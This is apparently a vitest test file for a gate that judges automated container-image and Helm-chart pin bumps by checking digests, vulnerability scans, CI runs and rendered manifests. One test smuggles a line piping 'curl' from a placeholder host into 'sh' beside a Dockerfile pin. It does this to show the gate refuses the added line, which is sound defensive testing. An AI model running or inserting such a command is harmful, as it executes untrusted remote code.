import { cpSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import type { Chart, Item } from '../apps/factory/src/vulnerabilities/inventory.ts';
import {
  hashesOf,
  IMAGE_CHECK,
  lineChanges,
  manifestsDiffer,
  onlyPinsChange,
  type PinMoveIO,
  POSTGRES_FILE,
  pinMove,
  type Rewritten,
  type Run,
  type Scan,
  staleRecords,
  TEST_SHARDS,
  ZAP_CHECK,
  ZAP_FILE,
} from './pin-move.ts';

// The past pin changes of this repository, replayed as the App's: the same moves, as the pin watch would write them.

const HEAD = 'c'.repeat(40);
const hex = (c: string) => c.repeat(64);
const ZAP = 'ghcr.io/zaproxy/zaproxy';
const zap = (tag: string, d: string) => `${ZAP}:${tag}@sha256:${hex(d)}`;
const FIXED: Scan = { read: true, findings: [{ id: 'CVE-1', pkg: 'openssl', severity: 'HIGH', fixed: true }] };
const CLEAN: Scan = { read: true, findings: [] };

/** git's `--raw` list of the files, and each file whole at both commits, its other lines the same at both. */
function diffOf(lines: { file: string; line: number; before: string; after: string }[], status = 'M', mode = '100644') {
  const paths = [...new Set(lines.map((l) => l.file))];
  const raw = paths.map((f) => `:${mode} ${mode} ${'1'.repeat(40)} ${'2'.repeat(40)} ${status}\t${f}`).join('\n');
  const files = paths.map((path) => {
    const mine = lines.filter((l) => l.file === path);
    const length = Math.max(...mine.map((l) => l.line)) + 2;
    const text = (side: 'before' | 'after') =>
      Array.from({ length }, (_, i) => mine.find((l) => l.line === i + 1)?.[side] ?? `  # line ${i + 1}`).join('\n');
    return { path, before: text('before'), after: text('after') };
  });
  return { raw, files };
}

interface Case {
  base: Item[];
  head: Item[];
  lines: { file: string; line: number; before: string; after: string }[];
  io?: Partial<PinMoveIO>;
}

const run = (name: string, conclusion: string | null = 'success', more: Partial<Run> = {}): Run => ({
  id: 10,
  name,
  head_sha: HEAD,
  status: 'completed',
  conclusion,
  app: { slug: 'github-actions' },
  ...more,
});

/** A reader of the case's answers: every fact the rule reads, each passing unless the case says otherwise. */
function reader({ base, head, lines, io = {} }: Case): PinMoveIO {
  const { raw, files } = diffOf(lines);
  return {
    diff: async () => ({ raw, files }),
    list: async (side) => (side === 'base' ? base : head),
    unlisted: async () => [],
    tags: async (repository) =>
      repository.endsWith('k8s-sidecar')
        ? ['2.11.2', '2.14.3']
        : ['2.16.0', '2.17.0', '2.17.1-rc1', '18.6-alpine3.24', '18.7-alpine3.24', '19.0-alpine3.24'],
    digest: async (reference) =>
      ({
        [`${ZAP}:2.17.0`]: `sha256:${hex('b')}`,
        [`${ZAP}:2.16.0`]: `sha256:${hex('9')}`,
        'postgres:18.7-alpine3.24': `sha256:${hex('e')}`,
        'postgres:18.6-alpine3.24': `sha256:${hex('d')}`,
        'node:24.22.2-trixie-slim': `sha256:${hex('f')}`,
        'kiwigrid/k8s-sidecar:2.14.3': `sha256:${hex('5')}`,
      })[reference] ?? `sha256:${hex('0')}`,
    chartVersions: async () => ['13.5.0', '13.7.0', '14.3.1'],
    render: async (side, chart) => rendered(side, chart),
    // The overlay runs Postgres, and the admission policy copies its digest: both move with the pin, and nothing else.
    overlay: async (side) => {
      const pg = lines.some((l) => l.file === POSTGRES_FILE) && side === 'head' ? PG_B : PG_A;
      return `kind: StatefulSet\nspec:\n  image: ${pg}\n---\nkind: ImageValidatingPolicy\nallowed: ['${pg.split('@')[1]}']\n`;
    },
    hashes: async () => ({ 'admission-refusals': 'x', 'mark-refusals': 'y' }),
    scan: async (reference) =>
      reference.endsWith(hex('a')) || reference.endsWith(hex('d')) || reference.includes('2.11.2') ? FIXED : CLEAN,
    runs: async () => [run(ZAP_CHECK), run(IMAGE_CHECK), ...TEST_SHARDS.map((name) => run(name))],
    ...io,
  };
}

const GRAFANA: Chart = {
  repo: 'https://grafana.github.io/helm-charts',
  chart: 'grafana',
  version: '13.5.0',
  release: 'grafana',
  values: ['deploy/base/telemetry/values/grafana.yaml'],
};

function rendered(side: 'base' | 'head', chart: Chart) {
  const sidecar =
    side === 'base'
      ? `kiwigrid/k8s-sidecar:2.11.2@sha256:${hex('4')}`
      : `kiwigrid/k8s-sidecar:2.14.3@sha256:${hex('5')}`;
  const grafana = chart.version === '13.5.0' ? 'grafana/grafana:12.0.0' : 'grafana/grafana:12.0.1';
  return [
    'kind: Deployment',
    'metadata:',
    '  labels:',
    `    helm.sh/chart: grafana-${chart.version}`,
    'spec:',
    `  image: ${grafana}`,
    `  sidecar: ${sidecar}`,
    `        image: ${sidecar}`,
  ].join('\n');
}

const zapItem = (image: string): Item => ({ kind: 'workflow', name: image, file: ZAP_FILE, line: 32, image });
const zapLine = (image: string) => `  '${image}';`;
const ZAP_LINE = { file: ZAP_FILE, line: 32, before: zapLine(zap('2.17.0', 'a')), after: zapLine(zap('2.17.0', 'b')) };
/** ZAP's digest (#993): the same tag, at the digest it names now. */
const ZAP_CASE: Case = {
  base: [zapItem(zap('2.17.0', 'a'))],
  head: [zapItem(zap('2.17.0', 'b'))],
  lines: [ZAP_LINE],
};
const zapTo = (image: string, io?: Partial<PinMoveIO>): Case => ({
  base: ZAP_CASE.base,
  head: [zapItem(image)],
  lines: [{ file: ZAP_FILE, line: 32, before: zapLine(zap('2.17.0', 'a')), after: zapLine(image) }],
  ...(io ? { io } : {}),
});

const PG_A = `postgres:18.6-alpine3.24@sha256:${hex('d')}`;
const PG_B = `postgres:18.7-alpine3.24@sha256:${hex('e')}`;
const pgItem = (image: string): Item => ({ kind: 'third-party', name: image, file: POSTGRES_FILE, line: 21, image });
/** A Postgres digest, as the App would move it: the pin's line alone. */
const POSTGRES: Case = {
  base: [pgItem(PG_A)],
  head: [pgItem(PG_B)],
  lines: [{ file: POSTGRES_FILE, line: 21, before: `          image: ${PG_A}`, after: `          image: ${PG_B}` }],
};

const grafanaItem = (version: string, digest: string): Item => ({
  kind: 'chart',
  name: 'grafana',
  file: 'deploy/base/telemetry/grafana.yaml',
  line: 12,
  chart: { ...GRAFANA, version },
  pins: [{ file: 'deploy/base/telemetry/values/grafana.yaml', line: 32, digest: `sha256:${hex(digest)}` }],
});
const SIDECAR_LINE = (tag: string, d: string) => `    tag: ${tag}@sha256:${hex(d)}`;
const SIDECAR_CHANGE = {
  file: 'deploy/base/telemetry/values/grafana.yaml',
  line: 32,
  before: SIDECAR_LINE('2.11.2', '4'),
  after: SIDECAR_LINE('2.14.3', '5'),
};
/** Grafana's sidecar (#995), one of its two values, as the App would move it. */
const SIDECAR: Case = {
  base: [grafanaItem('13.5.0', '4')],
  head: [grafanaItem('13.5.0', '5')],
  lines: [SIDECAR_CHANGE],
};

const judged = (c: Case) => pinMove(reader(c), HEAD);
const reasonOf = async (c: Case) => {
  const result = await judged(c);
  return 'reason' in result ? result.reason : `passed: ${result.move.name}`;
};

describe('a pin move, replayed as the App would make it', () => {
  it("passes ZAP's digest (#993): the tag's digest now, a fix gone, nothing new, and ZAP scan ran it", async () => {
    const result = await judged(ZAP_CASE);
    expect(result).toMatchObject({ move: { name: ZAP, what: 'image' }, ran: [ZAP_CHECK], fixed: 1 });
  });

  it("passes a Dockerfile stage's move to the newest on its line, which image builds ran", async () => {
    const from = `node:24.21.0-trixie-slim@sha256:${hex('1')}`;
    const to = `node:24.22.2-trixie-slim@sha256:${hex('f')}`;
    const item = (image: string): Item => ({
      kind: 'dockerfile',
      name: image,
      file: 'apps/factory/Dockerfile',
      line: 3,
      image,
    });
    const c: Case = {
      base: [item(from)],
      head: [item(to)],
      lines: [
        { file: 'apps/factory/Dockerfile', line: 3, before: `FROM ${from} AS base`, after: `FROM ${to} AS base` },
      ],
      io: {
        tags: async () => ['24.21.0-trixie-slim', '24.22.2-trixie-slim', '25.0.0-trixie-slim', '24.22.2-alpine3.24'],
        scan: async (reference) => (reference === from ? FIXED : CLEAN),
      },
    };
    expect(await judged(c)).toMatchObject({ ran: [IMAGE_CHECK], fixed: 1 });
  });

  it('holds a Postgres digest while it stales the admission record, and passes it once it does not, on tests', async () => {
    const stale = { hashes: async (side: 'base' | 'head') => ({ 'admission-refusals': side, 'mark-refusals': 'y' }) };
    expect(await reasonOf({ ...POSTGRES, io: stale })).toMatch(/^it stales deploy\/test\/admission-refusals\.json/);
    expect(await judged(POSTGRES)).toMatchObject({ ran: TEST_SHARDS, fixed: 1 });
  });

  it("holds a sidecar's value until the platform check, with every other condition proved", async () => {
    expect(await reasonOf(SIDECAR)).toBe(
      "only a cluster runs grafana's value at deploy/base/telemetry/values/grafana.yaml:32: held until the platform check makes one from the change (task 34)",
    );
  });

  it("holds Argo CD's chart, which make up installs, and k3s, which waits for Martin", async () => {
    const argocd = (version: string): Item => ({
      kind: 'chart',
      name: 'argocd',
      file: 'Makefile',
      line: 7,
      chart: { repo: 'https://argoproj.github.io/argo-helm', chart: 'argo-cd', version, release: 'argocd', values: [] },
    });
    const io = {
      chartVersions: async () => ['10.9.5', '10.15.0'],
      render: async (_side: 'base' | 'head', chart: Chart) =>
        `image: quay.io/argoproj/argocd:${chart.version === '10.9.5' ? 'v3.5.6' : 'v3.6.1'}\n`,
      scan: async (reference: string) => (reference.endsWith('v3.5.6') ? FIXED : CLEAN),
    };
    const chart: Case = {
      base: [argocd('10.9.5')],
      head: [argocd('10.15.0')],
      lines: [{ file: 'Makefile', line: 7, before: 'ARGOCD_CHART := 10.9.5', after: 'ARGOCD_CHART := 10.15.0' }],
      io,
    };
    expect(await reasonOf(chart)).toBe('argocd is installed by make up: a merge does not apply it');
    const k3s = (image: string): Item => ({
      kind: 'k3s',
      name: image,
      file: 'deploy/k3d/cluster.yaml',
      line: 9,
      image,
    });
    const [a, b] = [`rancher/k3s:v1.37.1-k3s1@sha256:${hex('6')}`, `rancher/k3s:v1.37.2-k3s1@sha256:${hex('7')}`];
    const cluster: Case = {
      base: [k3s(a)],
      head: [k3s(b)],
      lines: [{ file: 'deploy/k3d/cluster.yaml', line: 9, before: `image: ${a}`, after: `image: ${b}` }],
      io: {
        tags: async () => ['v1.37.1-k3s1', 'v1.37.2-k3s1'],
        digest: async () => `sha256:${hex('7')}`,
        scan: async (reference) => (reference === a ? FIXED : CLEAN),
      },
    };
    expect(await reasonOf(cluster)).toBe(
      'rancher/k3s is the cluster’s own: a k3s move waits for Martin, whose cluster moves with it'.replace('’', "'"),
    );
  });
});

describe('a pin move holds, each for its one reason', () => {
  it('a second pin in the same change', async () => {
    const c: Case = {
      base: [...ZAP_CASE.base, pgItem(PG_A)],
      head: [...ZAP_CASE.head, pgItem(PG_B)],
      lines: [...ZAP_CASE.lines, ...POSTGRES.lines],
    };
    expect(await reasonOf(c)).toBe(`a second pin in the same change: postgres beside ${ZAP}`);
  });

  it("both sidecars' values in one change are two moves", async () => {
    const loki = (d: string): Item => ({
      ...grafanaItem('13.5.0', d),
      name: 'loki',
      file: 'deploy/base/telemetry/loki.yaml',
      pins: [{ file: 'deploy/base/telemetry/values/loki.yaml', line: 44, digest: `sha256:${hex(d)}` }],
    });
    const c: Case = {
      base: [...SIDECAR.base, loki('4')],
      head: [...SIDECAR.head, loki('5')],
      lines: [
        ...SIDECAR.lines,
        {
          file: 'deploy/base/telemetry/values/loki.yaml',
          line: 44,
          before: SIDECAR_LINE('2.11.2', '4'),
          after: SIDECAR_LINE('2.14.3', '5'),
        },
      ],
    };
    expect(await reasonOf(c)).toMatch(/^a second pin in the same change: loki's value/);
  });

  it('a line that is not a pin, though it changes only a version', async () => {
    const c: Case = {
      ...ZAP_CASE,
      lines: [...ZAP_CASE.lines, { file: ZAP_FILE, line: 40, before: '// ZAP 2.16.0', after: '// ZAP 2.17.0' }],
    };
    expect(await reasonOf(c)).toBe(`${ZAP_FILE}:40 is a line that is not a pin: // ZAP 2.17.0`);
    // Nor is the head rendered to find out: the base's list says which lines are pins.
    const read: string[] = [];
    const io = {
      list: async (side: 'base' | 'head') => {
        read.push(side);
        return side === 'base' ? c.base : c.head;
      },
    };
    await reasonOf({ ...c, io });
    expect(read).toEqual(['base']);
  });

  it("a pin's line that changes another version beside the pin", async () => {
    const line = (image: string, retries: number) => `  '${image}'; const RETRIES = ${retries};`;
    const c: Case = {
      ...ZAP_CASE,
      lines: [{ ...ZAP_LINE, before: line(zap('2.17.0', 'a'), 1), after: line(zap('2.17.0', 'b'), 2) }],
    };
    expect(await reasonOf(c)).toMatch(
      /^apps\/console\/zap\/scan\.ts:32 changes more than ghcr\.io\/zaproxy\/zaproxy's pin/,
    );
  });

  it('another image whose rendered line changes beside a chart value\u2019s move', async () => {
    const io = {
      render: async (side: 'base' | 'head', chart: Chart) =>
        `${rendered(side, chart)}\n        image: busybox:${side === 'base' ? '1.36' : '1.37'}`,
    };
    expect(await reasonOf({ ...SIDECAR, io })).toBe('the manifests change beyond the image: image: busybox:1.37');
  });

  it('a line that changes more than a version or a digest', async () => {
    const c: Case = {
      ...ZAP_CASE,
      lines: [{ ...ZAP_LINE, after: zapLine(zap('2.17.0', 'b')).replace('zaproxy:', 'zaproxy2:') }],
    };
    expect(await reasonOf(c)).toMatch(/^apps\/console\/zap\/scan\.ts:32 changes more than a version or a digest/);
  });

  it('a digest that is not the tag’s', async () => {
    expect(await reasonOf(zapTo(zap('2.17.0', 'c')))).toMatch(
      /^a digest that is not the tag's: ghcr\.io\/zaproxy\/zaproxy:2\.17\.0 is sha256:bbbb/,
    );
  });

  it('a move backwards', async () => {
    expect(await reasonOf(zapTo(zap('2.16.0', '9')))).toBe('a move backwards, from 2.17.0 to 2.16.0');
  });

  it('a major', async () => {
    expect(await reasonOf(zapTo(zap('3.0.0', '3')))).toBe('a major, from 2.17.0 to 3.0.0');
  });

  it('a newer tag that is not the newest on the line', async () => {
    const io = { tags: async () => ['2.17.0', '2.17.1', '2.17.2'], digest: async () => `sha256:${hex('8')}` };
    expect(await reasonOf(zapTo(zap('2.17.1', '8'), io))).toBe(
      '2.17.1 is not the newest tag on 2.17.0’s line, 2.17.2'.replace('’', "'"),
    );
  });

  it('a target that brings a new High', async () => {
    const io = {
      scan: async (reference: string) =>
        reference.endsWith(hex('a'))
          ? FIXED
          : { read: true, findings: [{ id: 'CVE-9', pkg: 'zlib', severity: 'HIGH', fixed: false }] },
    };
    expect(await reasonOf({ ...ZAP_CASE, io })).toBe(`a target that brings a new HIGH: ${zap('2.17.0', 'b')}`);
  });

  it('a move that fixes nothing, and a scan that read nothing', async () => {
    expect(await reasonOf({ ...ZAP_CASE, io: { scan: async () => CLEAN } })).toBe(
      'the scans show no finding with a fix gone: the move fixes nothing',
    );
    const io = {
      scan: async (reference: string) => (reference.endsWith(hex('a')) ? FIXED : { read: false, findings: [] }),
    };
    expect(await reasonOf({ ...ZAP_CASE, io })).toBe(`the scan of ${zap('2.17.0', 'b')} read nothing`);
  });

  it('a chart whose manifests change', async () => {
    const io = {
      render: async (side: 'base' | 'head', chart: Chart) =>
        `${rendered(side, chart)}${side === 'head' ? '\n  replicas: 3' : '\n  replicas: 1'}`,
    };
    expect(await reasonOf({ ...SIDECAR, io })).toBe('the manifests change beyond the image: replicas: 3');
  });

  it('an image the cluster runs whose overlay changes beyond its references', async () => {
    const io = { overlay: async (side: 'base' | 'head') => `image: x\nargs: [${side === 'base' ? '--a' : '--b'}]\n` };
    expect(await reasonOf({ ...POSTGRES, io })).toBe('the manifests change beyond the image: args: [--b]');
  });

  it("Trivy's own pin, and Syft's", async () => {
    const trivy = (d: string) => `ghcr.io/aquasecurity/trivy:0.76.2@sha256:${hex(d)}`;
    const item = (image: string): Item => ({
      kind: 'workflow',
      name: image,
      file: 'deploy/images/trivy/Dockerfile',
      line: 9,
      image,
    });
    const c: Case = {
      base: [item(trivy('a'))],
      head: [item(trivy('b'))],
      lines: [
        { file: 'deploy/images/trivy/Dockerfile', line: 9, before: `FROM ${trivy('a')}`, after: `FROM ${trivy('b')}` },
      ],
    };
    expect(await reasonOf(c)).toBe("Trivy's own pin: a scanner cannot vouch for its replacement, so it is Martin's");
    const syft = (d: string) => `anchore/syft:v1.57.1@sha256:${hex(d)}`;
    const s: Case = {
      base: [{ ...item(syft('a')), file: 'deploy/images/syft/Dockerfile' }],
      head: [{ ...item(syft('b')), file: 'deploy/images/syft/Dockerfile' }],
      lines: [
        { file: 'deploy/images/syft/Dockerfile', line: 9, before: `FROM ${syft('a')}`, after: `FROM ${syft('b')}` },
      ],
    };
    expect(await reasonOf(s)).toBe("Syft's own pin: a scanner cannot vouch for its replacement, so it is Martin's");
  });

  it('a pin under .github/, and one of mise’s files', async () => {
    const workflow = '.github/workflows/check.yml';
    const c: Case = { ...ZAP_CASE, lines: [{ ...ZAP_LINE, file: workflow }] };
    expect(await reasonOf(c)).toBe(
      `it changes ${workflow}: a pin under .github/ is a workflow's, and the App writes none`,
    );
    const mise: Case = { ...ZAP_CASE, lines: [{ ...ZAP_LINE, file: 'mise.lock' }] };
    expect(await reasonOf(mise)).toBe(
      "it changes mise.lock: mise's files move only when someone upgrades the toolchain",
    );
  });

  it('an image of ours, which passes only as an exact pin', async () => {
    const ours = (d: string) => `ghcr.io/the-roganator/cv-software-factory/browser:1@sha256:${hex(d)}`;
    const c: Case = {
      base: [zapItem(ours('a'))],
      head: [zapItem(ours('b'))],
      lines: [{ ...ZAP_LINE, before: zapLine(ours('a')), after: zapLine(ours('b')) }],
    };
    expect(await reasonOf(c)).toMatch(/is an image of ours, which passes only as an exact pin/);
  });

  it('a pin the list does not read at the head', async () => {
    const io = { unlisted: async () => [{ file: 'x.ts', line: 3, reference: `y@sha256:${hex('1')}`, why: 'unread' }] };
    expect(await reasonOf({ ...ZAP_CASE, io })).toMatch(/^the list does not read 1 pin at the head: x\.ts:3/);
  });

  it('the list adding an item, or one at another place', async () => {
    expect(await reasonOf({ ...ZAP_CASE, head: [...ZAP_CASE.head, pgItem(PG_B)] })).toBe(
      'the list has 2 items at the head and 1 at the base: it adds or removes one',
    );
    expect(await reasonOf({ ...ZAP_CASE, head: [{ ...zapItem(zap('2.17.0', 'b')), line: 33 }] })).toMatch(
      /is not at the same place/,
    );
  });

  it('a value with no tag beside its digest', async () => {
    const c: Case = {
      ...SIDECAR,
      lines: [{ ...SIDECAR_CHANGE, before: `    digest: sha256:${hex('4')}`, after: `    digest: sha256:${hex('5')}` }],
    };
    expect(await reasonOf(c)).toMatch(/writes no tag beside its digest to resolve$/);
  });

  it('a check that did not run what the pin runs, was skipped, or failed at its latest attempt', async () => {
    expect(await reasonOf({ ...ZAP_CASE, io: { runs: async () => [] } })).toBe('ZAP scan has not run at ccccccc');
    expect(await reasonOf({ ...ZAP_CASE, io: { runs: async () => [run(ZAP_CHECK, 'skipped')] } })).toBe(
      'ZAP scan at ccccccc is skipped, not a success: something must run it',
    );
    const retried = [run(ZAP_CHECK, 'success', { id: 1 }), run(ZAP_CHECK, 'failure', { id: 2 })];
    expect(await reasonOf({ ...ZAP_CASE, io: { runs: async () => retried } })).toMatch(/is failure, not a success/);
    const foreign = [run(ZAP_CHECK, 'success', { app: { slug: 'mrogan-software-factory' } })];
    expect(await reasonOf({ ...ZAP_CASE, io: { runs: async () => foreign } })).toBe('ZAP scan has not run at ccccccc');
    const elsewhere = [run(ZAP_CHECK, 'success', { head_sha: 'd'.repeat(40) })];
    expect(await reasonOf({ ...ZAP_CASE, io: { runs: async () => elsewhere } })).toBe(
      'ZAP scan has not run at ccccccc',
    );
    const shards = TEST_SHARDS.slice(0, 2).map((name) => run(name));
    expect(await reasonOf({ ...POSTGRES, io: { runs: async () => shards } })).toBe(
      'tests (3/3) has not run at ccccccc',
    );
  });

  it('a fact it could not read: the whole judgement fails, and the gate holds on it', async () => {
    const io = { digest: async () => Promise.reject(new Error('ghcr.io answered 503')) };
    await expect(judged({ ...ZAP_CASE, io })).rejects.toThrow('ghcr.io answered 503');
  });
});

describe("a change's lines", () => {
  it('reads a rewrite of versions and digests, and nothing else', () => {
    expect(onlyPinsChange(zapLine(zap('2.17.0', 'a')), zapLine(zap('2.17.1', 'b')))).toBe(true);
    expect(onlyPinsChange('targetRevision: 13.5.0', 'targetRevision: 13.7.0')).toBe(true);
    expect(onlyPinsChange('image: a/b:1', 'image: a/c:1')).toBe(false);
    expect(onlyPinsChange('image: a/b:1', 'image: a/b:1 ')).toBe(false);
    expect(onlyPinsChange('image: a/b:1', 'image: a/b:1')).toBe(false);
    expect(onlyPinsChange('tag: 1@sha256:abc', 'tag: 1@sha256:abd')).toBe(false);
  });

  it('refuses a file added, deleted, renamed, of another mode, binary, or with its last newline changed', () => {
    const one = { file: 'a.yaml', line: 1, before: 'v: 1.0.0', after: 'v: 1.0.1' };
    const ok = diffOf([one]);
    const file = ok.files[0] as Rewritten;
    expect(lineChanges(ok.raw, ok.files)).toEqual({ lines: [one] });
    expect(lineChanges(diffOf([one], 'A').raw, ok.files)).toEqual({ reason: 'a.yaml is added, not modified in place' });
    expect(lineChanges(ok.raw.replace('100644 100644', '100644 100755'), ok.files)).toEqual({
      reason: 'a.yaml changes its mode, or is not a regular file',
    });
    expect(lineChanges(diffOf([one], 'M', '120000').raw, ok.files)).toMatchObject({ reason: /not a regular file/ });
    expect(lineChanges(ok.raw, [{ ...file, after: `${file.after}\n` }])).toMatchObject({
      reason: /adds or removes a line/,
    });
    expect(lineChanges(ok.raw, [{ ...file, after: `${file.after}\0` }])).toEqual({ reason: 'a.yaml is binary' });
    expect(lineChanges(ok.raw, [{ ...file, after: `extra: 1\n${file.after}` }])).toMatchObject({
      reason: /adds or removes a line/,
    });
    expect(lineChanges(ok.raw, [])).toEqual({ reason: 'the gate did not read a.yaml at both commits' });
    expect(lineChanges(ok.raw, [{ ...file, after: file.before }])).toEqual({ reason: 'a.yaml rewrites no line' });
    expect(lineChanges('', [])).toEqual({ reason: 'it changes no file' });
  });

  // A unified diff marks a file's header with `+++` and `---`: a line whose own text begins `++ ` or `-- ` would look
  // like one there. Compared whole, it is a line added like any other.
  it('sees a line whose text looks like a patch header, added or removed beside a pin', () => {
    const one = { file: 'apps/factory/Dockerfile', line: 1, before: 'FROM node:1.0.0', after: 'FROM node:1.0.1' };
    const ok = diffOf([one]);
    const file = ok.files[0] as Rewritten;
    for (const smuggled of ['++ ; curl -s https://example.invalid/x | sh; true \\', '-- dropped', '+++ b/other'])
      expect(lineChanges(ok.raw, [{ ...file, after: `${file.after}\n${smuggled}` }])).toMatchObject({
        reason: /adds or removes a line/,
      });
    const swapped = { ...file, before: `${file.before}\n-- kept`, after: `${file.after}\n++ added` };
    expect(lineChanges(ok.raw, [swapped])).toMatchObject({ reason: /changes more than a version or a digest/ });
  });
});

describe('the manifests and the records', () => {
  it("ignores the moved image's references and the chart's own version labels, and nothing else", () => {
    const base = `helm.sh/chart: x-1.0.0\nimage: a:1@sha256:${hex('1')}\nenv: [a:1@sha256:${hex('1')}]`;
    const head = `helm.sh/chart: x-1.0.1\nimage: a:2@sha256:${hex('2')}\nenv: [a:2@sha256:${hex('2')}]`;
    const refs = [`a:1@sha256:${hex('1')}`, `a:2@sha256:${hex('2')}`];
    expect(manifestsDiffer(base, head, refs)).toBeUndefined();
    expect(manifestsDiffer(base, `${head}\nmore: 1`, refs)).toMatch(/lines/);
    expect(manifestsDiffer(base, head.replace('env', 'envs'), refs)).toMatch(/beyond the image/);
    expect(manifestsDiffer('', '', refs)).toMatch(/empty/);
  });

  it('names each record whose hash moves, and holds on records it could not read', () => {
    expect(staleRecords({ a: '1', b: '2' }, { a: '1', b: '2' })).toBeUndefined();
    expect(staleRecords({ a: '1', b: '2' }, { a: '1', b: '3' })).toMatch(/^it stales deploy\/test\/b\.json/);
    expect(staleRecords({}, {})).toMatch(/no refusal record/);
    expect(staleRecords({ a: '1' }, { b: '1' })).toMatch(/other refusal records/);
  });

  // The real hash, as the gate computes it with main's policy-hash.ts: whether a Postgres digest stales the admission
  // record depends on whether that hash reads the digests admission admits, which #1008 takes out.
  it("holds a Postgres digest exactly when the policies' hash, as this checkout computes it, moves with it", async () => {
    const root = join(import.meta.dirname, '..');
    const dirs = ['base', 'head'].map((side) => {
      const dir = mkdtempSync(join(tmpdir(), `pin-move-${side}-`));
      cpSync(join(root, 'deploy'), join(dir, 'deploy'), { recursive: true });
      return dir;
    }) as [string, string];
    const file = join(dirs[1], POSTGRES_FILE);
    const text = readFileSync(file, 'utf-8');
    const pinned = /image: (postgres:\S+@sha256:[0-9a-f]{64})/.exec(text)?.[1] as string;
    writeFileSync(file, text.split(pinned.slice(-64)).join(hex('e')));
    const [base, head] = (await Promise.all(dirs.map(hashesOf))) as [Record<string, string>, Record<string, string>];
    const moves = base['admission-refusals'] !== head['admission-refusals'];
    const io = { hashes: async (side: 'base' | 'head') => (side === 'base' ? base : head) };
    const reason = await reasonOf({ ...POSTGRES, io });
    console.log(`A Postgres digest ${moves ? 'moves' : 'leaves'} the admission record's hash: ${reason}`);
    if (moves) expect(reason).toMatch(/^it stales deploy\/test\/admission-refusals\.json/);
    else expect(reason).toBe('passed: postgres');
    // Only the admission record reads the Postgres digest.
    for (const record of Object.keys(base).filter((r) => r !== 'admission-refusals'))
      expect(head[record]).toBe(base[record]);
  }, 60_000);
});
